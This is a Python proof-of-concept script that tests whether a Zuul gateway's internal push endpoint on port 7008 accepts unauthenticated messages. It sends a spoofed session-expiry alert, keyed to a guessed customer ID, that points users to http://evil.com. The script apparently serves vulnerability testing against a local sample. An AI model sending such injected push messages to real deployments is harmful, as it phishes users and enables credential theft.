import requests

def test_push_bypass():
    PUSH_URL = "http://localhost:7008/push"

    print("=== Zuul Unauthenticated Internal Push Messaging PoC ===")

    # Target CID (guessing or obtaining via other means)
    target_cid = "12345"
    message_payload = "{\"action\": \"ALARM\", \"message\": \"Your session has expired. Please login again at http://evil.com\"}"

    print(f"\n[+] Sending malicious push message to CID {target_cid} via {PUSH_URL}...")

    # Port 7008 is the internal HTTP push endpoint in the sample
    # It identifies target via X-CUSTOMER_ID or similar, but has no auth in sample
    headers = {
        "X-CUSTOMER_ID": target_cid,
        "Content-Type": "application/json"
    }

    try:
        resp = requests.post(PUSH_URL, headers=headers, data=message_payload)
        print(f"Status: {resp.status_code}")
        print(f"Response Body: {resp.text}")

        # In the sample, if a client is connected with this CID, it would return 202 or similar
        # If no client is connected, it might return 404 or success but no-op
        # The vulnerability is the lack of AUTH on this endpoint.
        if resp.status_code < 500:
             print("\n[!] VULNERABILITY CONFIRMED: Accessible unauthenticated internal push endpoint!")
             print("Attackers can inject arbitrary push messages if they can reach port 7008.")
        else:
             print("\n[-] Push endpoint returned error.")
    except Exception as e:
        print(f"\n[-] Failed to reach push endpoint: {e}")

if __name__ == "__main__":
    test_push_bypass()
